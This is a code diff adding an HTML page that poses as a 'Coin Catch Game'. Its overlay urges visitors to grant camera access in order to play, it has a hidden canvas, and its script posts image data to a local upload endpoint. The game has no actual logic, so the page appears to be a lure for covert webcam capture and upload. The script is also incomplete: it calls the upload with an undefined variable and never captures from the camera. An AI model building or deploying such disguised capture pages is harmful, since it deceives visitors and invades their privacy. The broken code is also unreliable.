@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coin Catch Game</title>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      font-family: monospace;
+      color: #0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    #canvas {
+      display: none;
+    }
+
+    #game-box {
+      position: relative;
+      background: #222;
+      width: 90vw;
+      max-width: 500px;
+      height: 500px;
+      overflow: hidden;
+      border: 2px solid #0f0;
+    }
+
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.1rem;
+      text-align: center;
+      padding: 10px;
+    }
+
+    #player {
+      width: 50px;
+      height: 50px;
+      background: yellow;
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+    }
+
+    .coin {
+      width: 30px;
+      height: 30px;
+      background: gold;
+      border-radius: 50%;
+      position: absolute;
+      top: 0;
+      z-index: 1;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-family: monospace;
+      background: #0f0;
+      border: none;
+      cursor: pointer;
+    }
+
+    #helpBtn {
+      background: #444;
+      color: white;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <div id="game-box">
+    <div id="player"></div>
+    <div id="overlay">
+      <p>This is a preview. Grant camera access to play!</p>
+      <button id="grantPermsBtn">Grant Camera Access</button>
+      <button id="helpBtn">Need Help?</button>
+    </div>
+  </div>
+
+  <script>
+    function sendToAPI(imageData) {
+      fetch("http://localhost:3000/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imageData })
+      }).catch(err => console.error("Upload failed", err));
+    }
+
+    sendToAPI(imageData);
+
+  </script>
+</body>
+
+</html>
